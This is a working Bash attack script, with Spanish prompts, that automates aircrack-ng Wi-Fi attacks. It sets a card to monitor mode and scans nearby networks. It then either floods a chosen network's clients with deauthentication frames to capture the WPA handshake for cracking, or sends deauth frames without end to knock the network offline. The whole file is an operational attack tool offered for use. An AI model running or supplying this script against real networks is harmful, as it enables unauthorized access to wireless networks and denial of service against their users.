#!/bin/bash
#Author: Alcatraz2033

RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" END="$(printf '\033[0m\e[0m')"

if [ $(id -u) -ne "0" ];then
    echo -e "${RED}\n[!] Ejecute este script como root...${END}"
    exit 1
fi 

function ctrl_c(){
    echo -e "${RED}\n[!] Saliendo...${END}"
    rm redes* captura-01.csv captura-01.kismet.csv captura-01.kismet.netxml captura-01.log.csv mac_users.txt  2>/dev/null 
	mv captura-01.cap $red_name.cap &>/dev/null
	mv $red_name.cap capturas  &>/dev/null
	rm $red_name.cap &>/dev/null 
    mon=$(networkctl 2>/dev/null |  awk '{print $(NF-3)}' 2>/dev/null)
    mon_comprobation=$(echo $mon | grep "mon")
    if [ $? == "0" ];then
        reverse 2>/dev/null 
    fi 
    exit 1
}

trap ctrl_c INT

function reverse(){
    echo -e "${WHITE}\n[+] ${GREEN}Regresando todo a la normalidad...${END}"
    service NetworkManager start
    service wpa_supplicant start
    lan=$(networkctl 2>/dev/null | grep "mon" | awk '{print $(NF-3)}')
    airmon-ng stop $lan &>/dev/null 
}

banner() {
	cat <<- EOF

${CYAN}                    ██   ██  █████   ██████ ██   ██ 
${CYAN}                    ██   ██ ██   ██ ██      ██  ██  
${CYAN}                    ███████ ███████ ██      █████   
${CYAN}                    ██   ██ ██   ██ ██      ██  ██  
${CYAN}                    ██   ██ ██   ██  ██████ ██   ██              
${MAGENTA}                            BY: Alcatraz2033                             
${CYAN}    ██   ██  █████  ███    ██ ██████  ███████ ██   ██  █████  ██   ██ ███████ 
${CYAN}    ██   ██ ██   ██ ████   ██ ██   ██ ██      ██   ██ ██   ██ ██  ██  ██      
${CYAN}    ███████ ███████ ██ ██  ██ ██   ██ ███████ ███████ ███████ █████   █████   
${CYAN}    ██   ██ ██   ██ ██  ██ ██ ██   ██      ██ ██   ██ ██   ██ ██  ██  ██      
${CYAN}    ██   ██ ██   ██ ██   ████ ██████  ███████ ██   ██ ██   ██ ██   ██ ███████ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	EOF
}

function cheker(){

	which aircrack-ng &>/dev/null
	if [ $? -ne "0" ];then
		echo -e "\n${CYAN}[+] Instalando aircrack-ng...${endColour}"
		sudo apt install aircrack-ng &>/dev/null
	fi
	which xterm &>/dev/null
	if [ $? -ne "0" ];then
		echo -e "\n${CYAN}[+] Instalando xterm...${endColour}"
		sudo apt install xterm &>/dev/null
	fi 
}

clear 
banner
cheker

interf=$(networkctl 2>/dev/null | awk '/unmanaged/{print $2}')
echo -e "\n${WHITE}[+] ${GREEN}Escoja la interfaz a poner en modo monitor"
echo ${WHITE}; select option in $interf;do
    echo -e "${WHITE}\n[+] ${GREEN}Matando procesos secundarios...${END}"
    airmon-ng check kill &>/dev/null
    echo -e "${WHITE}[+] ${GREEN}Iniciando $option en modo monitor...${END}"
    airmon-ng start $option &>/dev/null
    lan=$(networkctl 2>/dev/null | grep "mon" | awk '{print $(NF-3)}')
    echo "${WHITE}[+] ${GREEN}Modo monitor activado:${END} $lan"
    break
done 

echo -e "\n${WHITE}[+] ${GREEN}Listando redes WIFI${END}"
sleep 2

clear 
lan=$(networkctl 2>/dev/null | grep "mon" | awk '{print $(NF-3)}')
xterm -hold -e "airodump-ng $lan -w redes"
echo -e "\n${WHITE}[+] ${GREEN}Redes wifi encontradas, seleccione una${END}\n"
eleccion=$(awk -F',' '{print $14}' redes-01.csv | sed 's/ESSID//' | tr -s '\n' | sort | sed '/^\s*$/d' | sed 's/ /\//g')

select optiones in $eleccion;do
    red_name=$(echo $optiones | sed 's/\// /g')
    bssid=$(cat redes-01.csv | awk "/$red_name/{print \$1}" | head -n 1 | tr -d ',')
    channel=$(cat redes-01.csv | awk "/$red_name/{print \$6}" | head -n 1 | tr -d ',')
    break
done 

opt="Obtener_handshake Tumbar_la_red"

echo -e "\n${WHITE}[+] ${GREEN}Seleccione un modo de ataque${END}"
select ataque in $opt;do

	if [[ $ataque == "Obtener_handshake" ]];then

		xterm -hold -e "airodump-ng -c $channel --bssid $bssid -w captura $lan" &
		rm redes*

		echo -e "\n${WHITE}[!] ${GREEN}Una vez obtenido el handshake revise la carpeta 'capturas'${END}"
		echo -e "${RED}[!] Precione Ctrl_C para salir...${END}"
		sleep 3
		while true;do     
		    awk -F',' '{print $1}' captura-01.csv | tail -n+6 | sort | sed '/^\s*$/d' > mac_users.txt 
		    if [ -s mac_users.txt ];then
		        awk -F',' '{print $1}' captura-01.csv | tail -n+6 | sort | sed '/^\s*$/d' > mac_users.txt
		        for i in $(cat mac_users.txt);do 
		            xterm -hold -e "aireplay-ng -0 4 -a $bssid -c $i $lan" &
		            sleep 4
		            pid=$(pidof xterm | awk '{print $1}') &>/dev/null
		            kill -9 $pid &>/dev/null
		        done 
		    fi 
		done 2>/dev/null
		
	else
		xterm -hold -e "airodump-ng -c $channel --bssid $bssid -w captura $lan" &
		xterm -hold -e "aireplay-ng -0 0 -a $bssid $lan" &
		rm redes*
		echo
		while true;do
			echo -e "${CYAN}[+] ${WHITE}Tumbando la red: $red_name${END}"
			sleep 1
		done
	fi
done
